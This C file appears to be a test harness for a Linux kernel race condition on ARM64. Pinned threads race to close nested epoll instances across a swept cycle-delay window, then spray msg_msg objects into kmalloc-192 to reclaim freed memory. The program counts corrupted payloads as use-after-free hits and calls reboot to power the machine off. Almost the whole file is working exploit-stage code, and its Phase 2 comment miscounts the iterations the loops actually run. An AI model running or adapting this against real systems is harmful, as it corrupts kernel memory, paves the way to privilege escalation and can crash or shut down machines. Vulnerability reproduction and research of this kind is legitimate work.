// test_nat005.c — NAT-005: Closed-Loop Adaptive Launch-Ahead Search Harness
// Concentrated 250-550 Cycle Critical Window Search with Near-Miss Timing Instrumentation

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <time.h>
#include <sys/reboot.h>

#define CACHE_LINE_SIZE 64
#define TOTAL_TARGET_ITERATIONS 100000

// ARM64 High-Resolution Cycle Counters
static inline uint64_t get_cycles(void) {
    uint64_t val;
    asm volatile("mrs %0, cntvct_el0" : "=r" (val));
    return val;
}

static inline uint64_t get_cntfrq(void) {
    uint64_t val;
    asm volatile("mrs %0, cntfrq_el0" : "=r" (val));
    return val;
}

static void print_msg(const char *msg) {
    write(1, msg, strlen(msg));
}

// ------------------------------------------------------------
// Thread Shared State & Timing Telemetry
// ------------------------------------------------------------
typedef struct {
    volatile uint64_t val[CACHE_LINE_SIZE / 8];
} __attribute__((aligned(CACHE_LINE_SIZE))) bounce_line_t;

static bounce_line_t shared_bounce;
static atomic_int stop_bounce = 0;
static atomic_int sync_go = 0;
static atomic_int ready_a = 0, ready_b = 0;

static uint64_t current_launch_delay = 0;
static int ep_outer = -1;
static int ep_inner[2] = {-1, -1};
static atomic_long uaf_hits = 0;

// Telemetry timestamps per trial
static volatile uint64_t t_a_start = 0;
static volatile uint64_t t_a_end = 0;
static volatile uint64_t t_b_close_start = 0;
static volatile uint64_t t_b_close_end = 0;

void *bounce_worker(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    while (!atomic_load_explicit(&stop_bounce, memory_order_relaxed)) {
        shared_bounce.val[0]++;
        asm volatile("" ::: "memory");
    }
    return NULL;
}

void *adaptive_thread_a(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store(&ready_a, 1);
    while (!atomic_load(&sync_go)) { asm volatile("yield"); }

    t_a_start = get_cycles();
    close(ep_outer);
    t_a_end = get_cycles();
    return NULL;
}

void *adaptive_thread_b(void *arg) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store(&ready_b, 1);
    while (!atomic_load(&sync_go)) { asm volatile("yield"); }

    // Fine-Grained Launch-Ahead Spin Delay relative to sync_go
    uint64_t target = get_cycles() + current_launch_delay;
    while (get_cycles() < target) { asm volatile("yield"); }

    t_b_close_start = get_cycles();
    close(ep_inner[1]);
    t_b_close_end = get_cycles();

    // Reclaim spray via msg_msg (144 bytes user payload -> kmalloc-192)
    int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msqid >= 0) {
        struct { long mtype; char mtext[144]; } msg = { .mtype = 1 };
        memset(msg.mtext, 0x42, 144);
        for (int i = 0; i < 200; i++) {
            if (msgsnd(msqid, &msg, 144, IPC_NOWAIT) < 0) break;
        }
        // Verify payload integrity for stale NULL write at offset 160
        struct { long mtype; char mtext[144]; } rx_msg;
        if (msgrcv(msqid, &rx_msg, 144, 1, IPC_NOWAIT) > 0) {
            for (int k = 0; k < 144; k++) {
                if ((unsigned char)rx_msg.mtext[k] != 0x42) {
                    atomic_fetch_add(&uaf_hits, 1);
                    break;
                }
            }
        }
        msgctl(msqid, IPC_RMID, NULL);
    }
    return NULL;
}

// Executes a single trial and returns the timing delta (t_b_close_start - t_a_start)
int64_t run_adaptive_trial(uint64_t delay_cycles) {
    current_launch_delay = delay_cycles;
    atomic_store(&sync_go, 0);
    atomic_store(&ready_a, 0);
    atomic_store(&ready_b, 0);

    ep_outer = epoll_create1(0);
    ep_inner[0] = epoll_create1(0);
    ep_inner[1] = epoll_create1(0);
    if (ep_outer < 0 || ep_inner[0] < 0 || ep_inner[1] < 0) return 999999;

    int p0[2], p1[2];
    if (pipe(p0) < 0 || pipe(p1) < 0) return 999999;

    struct epoll_event ev = { .events = EPOLLIN };
    ev.data.fd = ep_inner[0];
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner[0], &ev);
    ev.data.fd = ep_inner[1];
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner[1], &ev);

    pthread_t ta, tb;
    pthread_create(&ta, NULL, adaptive_thread_a, NULL);
    pthread_create(&tb, NULL, adaptive_thread_b, NULL);

    while (!atomic_load(&ready_a) || !atomic_load(&ready_b)) { usleep(1); }

    atomic_store(&sync_go, 1);

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    close(ep_inner[0]);
    close(p0[0]); close(p0[1]);
    close(p1[0]); close(p1[1]);

    // Calculate relative timing delta between Thread B close and Thread A start
    int64_t delta = (int64_t)t_b_close_start - (int64_t)t_a_start;
    return delta;
}

int main(void) {
    char log_buf[384];
    uint64_t frq = get_cntfrq();
    snprintf(log_buf, sizeof(log_buf),
             "[NAT-005] Starting Closed-Loop Adaptive Search in Critical Window (250-550 cycles, freq: %lu Hz)\n", frq);
    print_msg(log_buf);

    // Start background cache bounce thread on CPU 1
    pthread_t tbounce;
    atomic_store(&stop_bounce, 0);
    pthread_create(&tbounce, NULL, bounce_worker, NULL);

    long completed_iterations = 0;
    int64_t min_near_miss_delta = 999999;
    uint64_t best_delay_setting = 0;

    // ------------------------------------------------------------
    // Phase 1: Fine-Grained Critical Window Sweep (250-550 cycles, step=10 cycles)
    // 31 steps x 2,800 iterations = 86,800 iterations (86.8% of total budget)
    // ------------------------------------------------------------
    print_msg("[NAT-005] Phase 1: Executing Fine-Grained Critical Window Sweep (250..550 cycles, step=10)...\n");

    for (uint64_t delay = 250; delay <= 550; delay += 10) {
        int64_t step_min_delta = 999999;
        for (int i = 0; i < 2800; i++) {
            int64_t delta = run_adaptive_trial(delay);
            completed_iterations++;

            // Near-miss metric: target alignment is ~350 cycles relative to t_a_start
            int64_t alignment_err = labs(delta - 350);
            if (alignment_err < step_min_delta) {
                step_min_delta = alignment_err;
            }

            if (alignment_err < min_near_miss_delta) {
                min_near_miss_delta = alignment_err;
                best_delay_setting = delay;
            }
        }

        snprintf(log_buf, sizeof(log_buf),
                 "[NAT-005] Critical Window Delay=%lu cycles: %ld iterations complete | best_alignment_err=%ld cycles\n",
                 delay, completed_iterations, step_min_delta);
        print_msg(log_buf);
    }

    // ------------------------------------------------------------
    // Phase 2: Outer Boundary Sweep (100..240 and 560..800 cycles, step=20 cycles)
    // 20 steps x 660 iterations = 13,200 iterations (13.2% of total budget)
    // Total iterations = 86,800 + 13,200 = 100,000
    // ------------------------------------------------------------
    print_msg("[NAT-005] Phase 2: Executing Boundary Sweep (100..240 and 560..800 cycles, step=20)...\n");

    for (uint64_t delay = 100; delay <= 240; delay += 20) {
        for (int i = 0; i < 330; i++) {
            run_adaptive_trial(delay);
            completed_iterations++;
        }
    }

    for (uint64_t delay = 560; delay <= 800; delay += 20) {
        for (int i = 0; i < 330; i++) {
            run_adaptive_trial(delay);
            completed_iterations++;
        }
    }

    atomic_store(&stop_bounce, 1);
    pthread_join(tbounce, NULL);

    snprintf(log_buf, sizeof(log_buf),
             "[NAT-005] Closed-Loop Adaptive Search FINAL RESULT:\n"
             "  - Total Iterations: %ld / %d\n"
             "  - Critical Window Focus: 250-550 cycles (step=10, 86.8%% budget)\n"
             "  - Best Delay Alignment Setting: %lu cycles\n"
             "  - Closest Near-Miss Alignment Error: %ld cycles\n"
             "  - Total UAF Hits: %ld\n",
             completed_iterations, TOTAL_TARGET_ITERATIONS, best_delay_setting, min_near_miss_delta, atomic_load(&uaf_hits));
    print_msg(log_buf);

    reboot(RB_POWER_OFF);
    return 0;
}
